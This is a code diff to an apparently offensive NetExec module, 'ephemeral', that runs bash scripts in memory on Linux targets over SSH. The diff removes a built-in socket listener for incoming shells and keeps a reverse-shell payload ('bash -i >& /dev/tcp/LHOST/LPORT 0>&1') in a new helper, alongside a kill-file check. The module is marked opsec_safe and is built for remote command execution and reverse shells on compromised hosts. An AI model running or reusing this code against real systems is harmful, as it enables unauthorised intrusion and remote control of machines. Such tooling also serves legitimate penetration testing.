@@ -2,12 +2,12 @@
 import threading
 import time
 import os
-import socket
-import uuid
+from nxc.modules.module_base import CATEGORY  # Import CATEGORY for module metadata
+
 
 class NXCModule:
     name = "ephemeral"
-    description = "Run bash scripts entirely in memory on a Linux target, optionally spawn ephemeral live shell"
+    description = "Run bash scripts entirely in memory on a Linux target"
     supported_protocols = ["ssh"]
     opsec_safe = True
     multiple_hosts = False
@@ -20,21 +20,27 @@ class NXCModule:
         self.raw_command = None
         self.thread = None
         self.liveshell = False
-        self.lhost = None
-        self.lport = None
         self.timeout = 60
         self.killfile = None
+        self.lhost = None
+        self.lport = None
 
     def options(self, context, module_options):
         self.script_path = module_options.get("SCRIPT")
         self.raw_command = module_options.get("COMMAND")
         self.liveshell = module_options.get("LIVESHELL", False)
-        self.lhost = module_options.get("LHOST")
-        self.lport = int(module_options.get("LPORT", 0)) if module_options.get("LPORT") else None
         self.timeout = int(module_options.get("TIMEOUT", 60))
-        self.killfile = module_options.get("KILLFILE", f"/tmp/kill_{uuid.uuid4().hex}") if self.liveshell else None
+        self.killfile = module_options.get("KILLFILE")
+        self.lhost = module_options.get("LHOST")
+        self.lport = int(module_options.get("LPORT")) if module_options.get("LPORT") else None
 
-        context.log.display(f"[ephemeral] LIVESHELL={self.liveshell}, TIMEOUT={self.timeout}, LHOST={self.lhost}, LPORT={self.lport}")
+        if self.liveshell and not self.timeout:
+            self.timeout = 60  # default timeout
+
+        context.log.display(
+            f"[ephemeral] LIVESHELL={self.liveshell}, TIMEOUT={self.timeout}, "
+            f"LHOST={self.lhost}, LPORT={self.lport}, KILLFILE={self.killfile}"
+        )
 
     def on_login(self, context, connection):
         if not hasattr(connection, "conn") or connection.conn is None:
@@ -49,27 +55,18 @@ class NXCModule:
 
         context.log.display("[ephemeral] SSH login succeeded!")
 
-        # Determine command to run
-        if self.liveshell:
-            if not self.lhost or not self.lport:
-                context.log.error("[ephemeral] LIVESHELL requires LHOST and LPORT")
-                return
-
-            context.log.display(f"[ephemeral] Spawning live shell listener on {self.lhost}:{self.lport} ...")
-            listener_thread = threading.Thread(target=self._start_listener, args=(context,), daemon=True)
-            listener_thread.start()
-
-            script_content = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
-        elif self.script_path:
-            if not os.path.isfile(self.script_path):
-                context.log.error(f"[ephemeral] Script file not found: {self.script_path}")
-                return
+        # Determine script or command to run
+        if self.script_path:
             with open(self.script_path) as f:
                 script_content = f.read()
         elif self.raw_command:
             script_content = self.raw_command
         elif getattr(connection.args, "execute", None):
+            # fallback to NetExec -x command
             script_content = connection.args.execute
+        elif self.liveshell:
+            # If liveshell, run reverse shell inline
+            script_content = self._generate_reverse_shell()
         else:
             context.log.error("[ephemeral] No commands to execute.")
             return
@@ -78,9 +75,20 @@ class NXCModule:
         self.thread = threading.Thread(target=self._run_command, args=(context, script_content), daemon=True)
         self.thread.start()
 
-        # Wait until execution completes
+        # Keep alive until execution completes
         while self.thread.is_alive():
+            # Kill-switch check
+            if self.killfile and os.path.exists(self.killfile):
+                context.log.display(f"[ephemeral] Killfile {self.killfile} detected, terminating shell.")
+                break
             time.sleep(0.1)
+
+    def _generate_reverse_shell(self):
+        return (
+            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
+            if self.lhost and self.lport
+            else ""
+        )
 
     def _run_command(self, context, script_content):
         try:
@@ -122,43 +130,3 @@ class NXCModule:
             if self.conn:
                 self.conn.close()
                 context.log.display("[ephemeral] SSH connection closed due to error.")
-
-    def _start_listener(self, context):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.bind((self.lhost, self.lport))
-            sock.listen(1)
-            context.log.display(f"[ephemeral] Listening for incoming live shell on {self.lhost}:{self.lport} ...")
-            sock.settimeout(self.timeout)
-            conn, addr = sock.accept()
-            context.log.display(f"[ephemeral] Connection from {addr} established!")
-
-            # Optional killfile support
-            killfile_active = self.killfile is not None
-
-            while True:
-                cmd = input("$ ")
-                if not cmd:
-                    continue
-                conn.sendall(cmd.encode() + b"\n")
-                data = conn.recv(4096)
-                if not data:
-                    break
-                context.log.display(data.decode(errors="ignore").rstrip())
-
-                if killfile_active:
-                    try:
-                        with open(self.killfile) as kf:
-                            context.log.display(f"[ephemeral] Killfile {self.killfile} detected, terminating shell.")
-                            break
-                    except FileNotFoundError:
-                        pass
-
-            conn.close()
-            sock.close()
-            context.log.display("[ephemeral] Live shell session closed.")
-
-        except socket.timeout:
-            context.log.display(f"[ephemeral] Live shell listener timed out after {self.timeout} seconds.")
-        except Exception as e:
-            context.log.error(f"[ephemeral] Listener error: {e}")
